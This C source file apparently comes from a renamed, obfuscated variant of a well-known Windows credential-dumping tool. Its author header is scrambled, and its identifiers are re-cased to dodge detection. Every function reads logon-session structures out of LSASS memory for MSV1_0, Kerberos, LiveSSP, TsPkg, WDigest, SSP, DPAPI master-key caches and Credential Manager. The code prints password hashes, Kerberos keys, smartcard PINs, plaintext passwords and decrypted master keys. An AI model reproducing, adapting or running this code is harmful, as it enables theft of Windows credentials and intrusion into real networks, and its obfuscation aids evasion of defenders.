/*	HEstebqu SqUtI `PQu4nQbtjF`
	https://blog.PQu4nQbtjF.com
	isMW9TRNNJyHATgICHfOUxr
	Licence : https://GHViJ8cQzKiJugP.org/licenses/by/4.0/
*/
#include "kuhl_m_seKuRlSa_packages.h"

const ANSI_STRING PRIMARY_STRING = {7, 8, "Primary"}, CREDENTIALKEYS_STRING = {14, 15, "CredentialKeys"};
void CALLBACK kuhl_m_seKuRlSa_enum_logon_callback_mSv(IN ULONG_PTR reserved, IN PJlzW_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	JlzW_MSV1_0_CREDENTIALS crEdentials;
	JlzW_MSV1_0_PRIMARY_CREDENTIALS primaryCredentials;
	ULONG_PTR pPrimary, pCreds = (ULONG_PTR) pData->pCredentials;
	DWORD flags;

	while(pCreds)
	{
		if(ReadMemory(pCreds, &crEdentials, sizeof(JlzW_MSV1_0_CREDENTIALS), NULL))
		{
			pPrimary = (ULONG_PTR) crEdentials.PrimaryCredentials;
			while(pPrimary)
			{
				if(ReadMemory(pPrimary, &primaryCredentials, sizeof(JlzW_MSV1_0_PRIMARY_CREDENTIALS), NULL))
				{
					if(kull_m_string_getDbgUnicodeString(&primaryCredentials.Credentials))
					{
						if(kull_m_string_getDbgUnicodeString((PUNICODE_STRING) &primaryCredentials.Primary))
						{
							dprintf("\n\t [%08x] %Z", crEdentials.AuthenticationPackageId, &primaryCredentials.Primary);
							if(RtlEqualString(&primaryCredentials.Primary, &PRIMARY_STRING, FALSE))
								flags = KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY;
							else if(RtlEqualString(&primaryCredentials.Primary, &CREDENTIALKEYS_STRING, FALSE))
								flags = KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIALKEY;
							else
								flags = 0;

							kuhl_m_seKuRlSa_genericCredsOutput((PJlzW_GENERIC_PRIMARY_CREDENTIAL) &primaryCredentials.Credentials, pData->LogonId, KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIAL | flags);

							LocalFree(primaryCredentials.Primary.Buffer);
						}				
						LocalFree(primaryCredentials.Credentials.Buffer);
					}
				} else dprintf("n.e. (Lecture JlzW_MSV1_0_PRIMARY_CREDENTIALS KO)");
				pPrimary = (ULONG_PTR) primaryCredentials.next;
			}
			pCreds = (ULONG_PTR) crEdentials.next;
		} else dprintf("n.e. (Lecture JlzW_MSV1_0_CREDENTIALS KO)");
	}
}

const MSV1_0_PRIMARY_HELPER mSv1_0_primaryHelper[] = {
	{FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, LogonDomainName),			FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, UserName),			0,														FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, isNtOwfPassword),			FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, isLmOwfPassword),			FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, isShaOwPassword),			0,																	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, NtOwfPassword),			FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, LmOwfPassword),			FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, ShaOwPassword),			0,																	0},
	{FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, LogonDomainName),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, UserName),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isIso),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isNtOwfPassword),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isLmOwfPassword),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isShaOwPassword),	0,																	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, NtOwfPassword),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, LmOwfPassword),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, ShaOwPassword),	0,																	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, align0)},
	{FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, LogonDomainName),		FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, UserName),		FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isIso),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, isNtOwfPassword),		FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, isLmOwfPassword),		FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, isShaOwPassword),		0,																	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, NtOwfPassword),		FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, LmOwfPassword),		FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, ShaOwPassword),		0,																	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, align2)},
	{FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, LogonDomainName),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, UserName),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, isIso),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, isNtOwfPassword),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, isLmOwfPassword),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, isShaOwPassword),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, isDPAPIProtected),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, NtOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, LmOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, ShaOwPassword),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, DPAPIProtected),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, isoSize)},
};

const MSV1_0_PRIMARY_HELPER * kuhl_m_seKuRlSa_mSv_helper()
{
	const MSV1_0_PRIMARY_HELPER * helper;
	if(NtBuildNumber < KULL_M_WIN_BUILD_10_1507)
		helper = &mSv1_0_primaryHelper[0];
	else if(NtBuildNumber < KULL_M_WIN_BUILD_10_1511)
		helper = &mSv1_0_primaryHelper[1];
	else if(NtBuildNumber < KULL_M_WIN_BUILD_10_1607)
		helper = &mSv1_0_primaryHelper[2];
	else
		helper = &mSv1_0_primaryHelper[3];
	return helper;
}

const KERB_INFOS kerbHelper[] = {
	{
		FIELD_OFFSET(JlzW_KERBEROS_LOGON_SESSION, LocallyUniqueIdentifier),
		FIELD_OFFSET(JlzW_KERBEROS_LOGON_SESSION, crEdentials),
		FIELD_OFFSET(JlzW_KERBEROS_LOGON_SESSION, SmartcardInfos),
		FIELD_OFFSET(JlzW_KERBEROS_LOGON_SESSION, pKeyList),
		FIELD_OFFSET(KERB_HASHPASSWORD_6, generic),
		sizeof(KERB_HASHPASSWORD_6),
		sizeof(JlzW_KERBEROS_LOGON_SESSION),
		FIELD_OFFSET(JlzW_KERBEROS_CSP_INFOS_60, CspDataLength),
		FIELD_OFFSET(JlzW_KERBEROS_CSP_INFOS_60, CspData) + FIELD_OFFSET(KERB_SMARTCARD_CSP_INFO, nCardNameOffset),
		FIELD_OFFSET(JlzW_KERBEROS_CSP_INFOS_60, CspData)
	},
	{
		FIELD_OFFSET(JlzW_KERBEROS_LOGON_SESSION, LocallyUniqueIdentifier),
		FIELD_OFFSET(JlzW_KERBEROS_LOGON_SESSION, crEdentials),
		FIELD_OFFSET(JlzW_KERBEROS_LOGON_SESSION, SmartcardInfos),
		FIELD_OFFSET(JlzW_KERBEROS_LOGON_SESSION, pKeyList),
		FIELD_OFFSET(KERB_HASHPASSWORD_6, generic),
		sizeof(KERB_HASHPASSWORD_6),
		sizeof(JlzW_KERBEROS_LOGON_SESSION),
		FIELD_OFFSET(JlzW_KERBEROS_CSP_INFOS_60, CspDataLength),
		FIELD_OFFSET(JlzW_KERBEROS_CSP_INFOS_60, CspData) + FIELD_OFFSET(KERB_SMARTCARD_CSP_INFO, nCardNameOffset),
		FIELD_OFFSET(JlzW_KERBEROS_CSP_INFOS_60, CspData)
	},
	{
		FIELD_OFFSET(JlzW_KERBEROS_LOGON_SESSION, LocallyUniqueIdentifier),
		FIELD_OFFSET(JlzW_KERBEROS_LOGON_SESSION, crEdentials),
		FIELD_OFFSET(JlzW_KERBEROS_LOGON_SESSION, SmartcardInfos),
		FIELD_OFFSET(JlzW_KERBEROS_LOGON_SESSION, pKeyList),
		FIELD_OFFSET(KERB_HASHPASSWORD_6, generic),
		sizeof(KERB_HASHPASSWORD_6),
		sizeof(JlzW_KERBEROS_LOGON_SESSION),
		FIELD_OFFSET(JlzW_KERBEROS_CSP_INFOS_62, CspDataLength),
		FIELD_OFFSET(JlzW_KERBEROS_CSP_INFOS_62, CspData) + FIELD_OFFSET(KERB_SMARTCARD_CSP_INFO, nCardNameOffset),
		FIELD_OFFSET(JlzW_KERBEROS_CSP_INFOS_62, CspData)
	},
	{
		FIELD_OFFSET(JlzW_KERBEROS_LOGON_SESSION_10, LocallyUniqueIdentifier),
		FIELD_OFFSET(JlzW_KERBEROS_LOGON_SESSION_10, crEdentials),
		FIELD_OFFSET(JlzW_KERBEROS_LOGON_SESSION_10, SmartcardInfos),
		FIELD_OFFSET(JlzW_KERBEROS_LOGON_SESSION_10, pKeyList),
		FIELD_OFFSET(KERB_HASHPASSWORD_6, generic),
		sizeof(KERB_HASHPASSWORD_6),
		sizeof(JlzW_KERBEROS_LOGON_SESSION_10),
		FIELD_OFFSET(JlzW_KERBEROS_CSP_INFOS_10, CspDataLength),
		FIELD_OFFSET(JlzW_KERBEROS_CSP_INFOS_10, CspData) + FIELD_OFFSET(KERB_SMARTCARD_CSP_INFO, nCardNameOffset),
		FIELD_OFFSET(JlzW_KERBEROS_CSP_INFOS_10, CspData)
	},
	{
		FIELD_OFFSET(JlzW_KERBEROS_LOGON_SESSION_10_1607, LocallyUniqueIdentifier),
		FIELD_OFFSET(JlzW_KERBEROS_LOGON_SESSION_10_1607, crEdentials),
		FIELD_OFFSET(JlzW_KERBEROS_LOGON_SESSION_10_1607, SmartcardInfos),
		FIELD_OFFSET(JlzW_KERBEROS_LOGON_SESSION_10_1607, pKeyList),
		FIELD_OFFSET(KERB_HASHPASSWORD_6_1607, generic),
		sizeof(KERB_HASHPASSWORD_6_1607),
		sizeof(JlzW_KERBEROS_LOGON_SESSION_10_1607),
		FIELD_OFFSET(JlzW_KERBEROS_CSP_INFOS_10, CspDataLength),
		FIELD_OFFSET(JlzW_KERBEROS_CSP_INFOS_10, CspData) + FIELD_OFFSET(KERB_SMARTCARD_CSP_INFO, nCardNameOffset),
		FIELD_OFFSET(JlzW_KERBEROS_CSP_INFOS_10, CspData)
	}
};

void CALLBACK kuhl_m_seKuRlSa_enum_logon_callback_kErberoS(IN ULONG_PTR pKerbGlobalLogonSessionTable, IN PJlzW_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	PBYTE data;
	JlzW_KERBEROS_KEYS_LIST_6 keyList;
	PKERB_HASHPASSWORD_6 pHashPassword;
	DWORD i, szCsp;
	ULONG_PTR ptr;
	ULONG KerbOffsetIndex;
	JlzW_GENERIC_PRIMARY_CREDENTIAL crEds = {0};
	PBYTE infosCsp;
	
	if(NtBuildNumber < KULL_M_WIN_MIN_BUILD_7)
		KerbOffsetIndex = 0;
	else if(NtBuildNumber < KULL_M_WIN_MIN_BUILD_8)
		KerbOffsetIndex = 1;
	else if(NtBuildNumber < KULL_M_WIN_MIN_BUILD_10)
		KerbOffsetIndex = 2;
	else if(NtBuildNumber < KULL_M_WIN_BUILD_10_1607)
		KerbOffsetIndex = 3;
	else
		KerbOffsetIndex = 4;

	if(ptr = kuhl_m_seKuRlSa_utils_pFromAVLByLuid(pKerbGlobalLogonSessionTable, kerbHelper[KerbOffsetIndex].offsetLuid, pData->LogonId))
	{
		if(data = (PBYTE) LocalAlloc(LPTR, kerbHelper[KerbOffsetIndex].structSize))
		{
			if(ReadMemory(ptr, data, (ULONG) kerbHelper[KerbOffsetIndex].structSize, NULL))
			{
				kuhl_m_seKuRlSa_genericCredsOutput((PJlzW_GENERIC_PRIMARY_CREDENTIAL) (data + kerbHelper[KerbOffsetIndex].offsetCreds), pData->LogonId, (NtBuildNumber < KULL_M_WIN_BUILD_10_1507) ? 0 : (NtBuildNumber < KULL_M_WIN_BUILD_10_1607) ? KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10 : KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10_1607);

				if(ptr = (ULONG_PTR) *(PVOID *) (data + kerbHelper[KerbOffsetIndex].offsetPin))
					if(infosCsp = (PBYTE) LocalAlloc(LPTR, kerbHelper[KerbOffsetIndex].structCspInfosSize))
					{
						if(ReadMemory(ptr, infosCsp, (ULONG) kerbHelper[KerbOffsetIndex].structCspInfosSize, NULL))
						{
							crEds.UserName = *(PUNICODE_STRING) infosCsp;
							if(szCsp = *(PDWORD) (infosCsp + kerbHelper[KerbOffsetIndex].offsetSizeOfCsp))
							{
								crEds.Domaine.Length = (USHORT)	(szCsp - (kerbHelper[KerbOffsetIndex].offsetNames - kerbHelper[KerbOffsetIndex].structCspInfosSize));
								if(crEds.Domaine.Buffer = (PWSTR) LocalAlloc(LPTR, crEds.Domaine.Length))
									ReadMemory(ptr + kerbHelper[KerbOffsetIndex].offsetNames, crEds.Domaine.Buffer, crEds.Domaine.Length, NULL);
							}
							kuhl_m_seKuRlSa_genericCredsOutput(&crEds, pData->LogonId, KUHL_SEKURLSA_CREDS_DISPLAY_PINCODE);
							if(crEds.Domaine.Buffer)	
								LocalFree(crEds.Domaine.Buffer);
						}
						LocalFree(infosCsp);
					}
					if(ptr = (ULONG_PTR) *(PVOID *) (data + kerbHelper[KerbOffsetIndex].offsetKeyList))
						if(ReadMemory(ptr, &keyList, sizeof(JlzW_KERBEROS_KEYS_LIST_6)/* - sizeof(KERB_HASHPASSWORD_6)*/, NULL))
						{
							i = keyList.cbItem * (DWORD) kerbHelper[KerbOffsetIndex].structKeyPasswordHashSize;
							if(pHashPassword = (PKERB_HASHPASSWORD_6) LocalAlloc(LPTR, i))
							{
								if(ReadMemory(ptr + sizeof(JlzW_KERBEROS_KEYS_LIST_6)/* - sizeof(KERB_HASHPASSWORD_6)*/, pHashPassword, i, NULL))
								{
									dprintf("\n\t * Key List\n");
									for(i = 0; i < keyList.cbItem; i++)
										kuhl_m_seKuRlSa_genericCredsOutput((PJlzW_GENERIC_PRIMARY_CREDENTIAL) ((PBYTE) pHashPassword + i * kerbHelper[KerbOffsetIndex].structKeyPasswordHashSize + kerbHelper[KerbOffsetIndex].offsetHashGeneric), pData->LogonId, KUHL_SEKURLSA_CREDS_DISPLAY_KEY_LIST | ((NtBuildNumber < KULL_M_WIN_BUILD_10_1507) ? 0 : KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10));
								}
								LocalFree(pHashPassword);
							}
						}
			}
			LocalFree(data);
		}
	}
	else dprintf("KO");
}

void CALLBACK kuhl_m_seKuRlSa_enum_logon_callback_liVeSsP(IN ULONG_PTR pLiveGlobalLogonSessionList, IN PJlzW_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	JlzW_LIVESSP_LIST_ENTRY crEdentials;
	JlzW_LIVESSP_PRIMARY_CREDENTIAL primaryCredential;
	ULONG_PTR ptr;
	if(ptr = kuhl_m_seKuRlSa_utils_pFromLinkedListByLuid(pLiveGlobalLogonSessionList, FIELD_OFFSET(JlzW_LIVESSP_LIST_ENTRY, LocallyUniqueIdentifier), pData->LogonId))
	{
		if(ReadMemory(ptr, &crEdentials, sizeof(JlzW_LIVESSP_LIST_ENTRY), NULL))
			if(ptr = (ULONG_PTR) crEdentials.suppCreds)
				if(ReadMemory(ptr, &primaryCredential, sizeof(JlzW_LIVESSP_PRIMARY_CREDENTIAL), NULL))
					kuhl_m_seKuRlSa_genericCredsOutput(&primaryCredential.crEdentials, pData->LogonId, (NtBuildNumber != 9431) ? 0 : KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT);
	} else dprintf("KO");
}

const JlzW_TS_CREDENTIAL_HELPER tsCredentialHelper[] = {
	{FIELD_OFFSET(JlzW_TS_CREDENTIAL, LocallyUniqueIdentifier),			FIELD_OFFSET(JlzW_TS_CREDENTIAL, pTsPrimary)},
	{FIELD_OFFSET(JlzW_TS_CREDENTIAL_1607, LocallyUniqueIdentifier),	FIELD_OFFSET(JlzW_TS_CREDENTIAL_1607, pTsPrimary)}
};

void CALLBACK kuhl_m_seKuRlSa_enum_logon_callback_tsPkG(IN ULONG_PTR pTSGlobalCredTable, IN PJlzW_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	JlzW_TS_PRIMARY_CREDENTIAL primaryCredential;
	ULONG_PTR ptr;
	PVOID buffer;
	LONG TsOffsetIndex = (NtBuildNumber < KULL_M_WIN_BUILD_10_1607) ? 0 : 1;

	if(ptr = kuhl_m_seKuRlSa_utils_pFromAVLByLuid(pTSGlobalCredTable, tsCredentialHelper[TsOffsetIndex].offsetToLuid, pData->LogonId))
	{
		if(ReadMemory(ptr + tsCredentialHelper[TsOffsetIndex].offsetToTsPrimary, &buffer, sizeof(PVOID), NULL))
			if(ReadMemory((ULONG_PTR) buffer, &primaryCredential, sizeof(JlzW_TS_PRIMARY_CREDENTIAL), NULL))
				kuhl_m_seKuRlSa_genericCredsOutput(&primaryCredential.crEdentials, pData->LogonId, KUHL_SEKURLSA_CREDS_DISPLAY_DOMAIN);
	}
	else dprintf("KO");
}

void CALLBACK kuhl_m_seKuRlSa_enum_logon_callback_wDiGeST(IN ULONG_PTR pl_LogSessList, IN PJlzW_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	ULONG_PTR ptr;
	BYTE buffer[offsetWDigestPrimary + sizeof(JlzW_GENERIC_PRIMARY_CREDENTIAL)];
	if(ptr = kuhl_m_seKuRlSa_utils_pFromLinkedListByLuid(pl_LogSessList, FIELD_OFFSET(JlzW_WDIGEST_LIST_ENTRY, LocallyUniqueIdentifier), pData->LogonId))
	{
		if(ReadMemory(ptr, buffer, sizeof(buffer), NULL))
			kuhl_m_seKuRlSa_genericCredsOutput((PJlzW_GENERIC_PRIMARY_CREDENTIAL) (buffer + offsetWDigestPrimary), pData->LogonId, 0);
	}
	else dprintf("KO");
}

void CALLBACK kuhl_m_seKuRlSa_enum_logon_callback_sSp(IN ULONG_PTR pSspCredentialList, IN PJlzW_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	JlzW_SSP_CREDENTIAL_LIST_ENTRY mesCredentials;
	ULONG_PTR ptr;
	ULONG monNb = 0;
	if(ReadMemory(pSspCredentialList, &mesCredentials, sizeof(LIST_ENTRY), NULL))
	{
		ptr = (ULONG_PTR) mesCredentials.Flink;
		while(ptr != pSspCredentialList)
		{
			if(ReadMemory(ptr, &mesCredentials, sizeof(JlzW_SSP_CREDENTIAL_LIST_ENTRY), NULL))
			{
				if(SecEqualLuid(pData->LogonId, &mesCredentials.LogonId) && (mesCredentials.crEdentials.UserName.Buffer || mesCredentials.crEdentials.Domaine.Buffer || mesCredentials.crEdentials.Password.Buffer))
				{
					dprintf("\n\t [%08x]", monNb++);
					kuhl_m_seKuRlSa_genericCredsOutput(&mesCredentials.crEdentials, pData->LogonId, KUHL_SEKURLSA_CREDS_DISPLAY_SSP | KUHL_SEKURLSA_CREDS_DISPLAY_DOMAIN);
				}
				ptr = (ULONG_PTR) mesCredentials.Flink;
			}
			else break;
		}
	}
	else dprintf("KO");
}

void CALLBACK kuhl_m_seKuRlSa_enum_logon_callback_masTerKeYs(IN ULONG_PTR pMasterKeyCacheList, IN PJlzW_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	JlzW_MASTERKEY_CACHE_ENTRY mesCredentials;
	ULONG_PTR ptr;
	ULONG monNb = 0;
	PBYTE buffer;

	if(ReadMemory(pMasterKeyCacheList, &mesCredentials, sizeof(LIST_ENTRY), NULL))
	{
		ptr = (ULONG_PTR) mesCredentials.Flink;
		while(ptr != pMasterKeyCacheList)
		{
			if(ReadMemory(ptr, &mesCredentials, sizeof(JlzW_MASTERKEY_CACHE_ENTRY), NULL))
			{
				if(SecEqualLuid(pData->LogonId, &mesCredentials.LogonId))
				{
					dprintf("\n\t [%08x]\n\t * GUID      :\t", monNb++);
					kull_m_string_displayGUID(&mesCredentials.KeyUid);
					dprintf("\n\t * Time      :\t"); kull_m_string_displayFileTime(&mesCredentials.insertTime);

					if(buffer = (PBYTE) LocalAlloc(LPTR, mesCredentials.keySize))
					{						
						if(ReadMemory(ptr + FIELD_OFFSET(JlzW_MASTERKEY_CACHE_ENTRY, key), buffer, mesCredentials.keySize, NULL))
						{
							kuhl_m_seKuRlSa_nt6_LsaUnprotectMemory(buffer, mesCredentials.keySize);
							dprintf("\n\t * MasterKey :\t"); kull_m_string_dprintf_hex(buffer, mesCredentials.keySize, 0);
						}
						LocalFree(buffer);
					}
				}
				ptr = (ULONG_PTR) mesCredentials.Flink;
			}
			else break;
		}
	}
	else dprintf("KO");
}

const CREDMAN_INFOS crEdhelper[] = {
	{
		sizeof(JlzW_CREDMAN_LIST_ENTRY_60),
		FIELD_OFFSET(JlzW_CREDMAN_LIST_ENTRY_60, Flink),
		FIELD_OFFSET(JlzW_CREDMAN_LIST_ENTRY_60, user),
		FIELD_OFFSET(JlzW_CREDMAN_LIST_ENTRY_60, server2),
		FIELD_OFFSET(JlzW_CREDMAN_LIST_ENTRY_60, cbEncPassword),
		FIELD_OFFSET(JlzW_CREDMAN_LIST_ENTRY_60, encPassword),
	},
	{
		sizeof(JlzW_CREDMAN_LIST_ENTRY),
		FIELD_OFFSET(JlzW_CREDMAN_LIST_ENTRY, Flink),
		FIELD_OFFSET(JlzW_CREDMAN_LIST_ENTRY, user),
		FIELD_OFFSET(JlzW_CREDMAN_LIST_ENTRY, server2),
		FIELD_OFFSET(JlzW_CREDMAN_LIST_ENTRY, cbEncPassword),
		FIELD_OFFSET(JlzW_CREDMAN_LIST_ENTRY, encPassword),
	},
};

void CALLBACK kuhl_m_seKuRlSa_enum_logon_callback_crEdMan(IN ULONG_PTR reserved, IN PJlzW_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	JlzW_CREDMAN_SET_LIST_ENTRY setList;
	JlzW_CREDMAN_LIST_STARTER listStarter;
	DWORD nbCred = 0;
	ULONG_PTR pCur, pRef;
	JlzW_GENERIC_PRIMARY_CREDENTIAL PTnhCreds;
	PBYTE buffer;
	ULONG CredOffsetIndex = (NtBuildNumber < KULL_M_WIN_BUILD_7) ? 0 : 1;

	if(pData->pCredentialManager)
	{
		if(ReadMemory((ULONG_PTR) pData->pCredentialManager, &setList, sizeof(JlzW_CREDMAN_SET_LIST_ENTRY), NULL))
		{
			if(setList.list1)
			{
				pRef = (ULONG_PTR) setList.list1 + FIELD_OFFSET(JlzW_CREDMAN_LIST_STARTER, start);
				if(ReadMemory((ULONG_PTR) setList.list1, &listStarter, sizeof(JlzW_CREDMAN_LIST_STARTER), NULL))
				{
					if(pCur = (ULONG_PTR) listStarter.start)
					{
						if(buffer = (PBYTE) LocalAlloc(LPTR, crEdhelper[CredOffsetIndex].structSize))
						{
							while(pCur != pRef)
							{
								pCur -= crEdhelper[CredOffsetIndex].offsetFLink;
								if(ReadMemory(pCur, buffer, crEdhelper[CredOffsetIndex].structSize, NULL))
								{
									dprintf("\n\t [%08x]", nbCred);
									PTnhCreds.UserName = *(PUNICODE_STRING) (buffer + crEdhelper[CredOffsetIndex].offsetUsername);
									PTnhCreds.Domaine = *(PUNICODE_STRING) (buffer + crEdhelper[CredOffsetIndex].offsetDomain);
									PTnhCreds.Password.Length = PTnhCreds.Password.MaximumLength = *(PUSHORT) (buffer + crEdhelper[CredOffsetIndex].offsetCbPassword);;
									PTnhCreds.Password.Buffer = *(PWSTR *) (buffer + crEdhelper[CredOffsetIndex].offsetPassword);
									kuhl_m_seKuRlSa_genericCredsOutput(&PTnhCreds, pData->LogonId, KUHL_SEKURLSA_CREDS_DISPLAY_CREDMANPASS);
									pCur = (ULONG_PTR) *(PVOID *) (buffer + crEdhelper[CredOffsetIndex].offsetFLink);
								}
								else break;
								nbCred++;
							}
							LocalFree(buffer);
						}
					}
				}
			}
		}
	}
}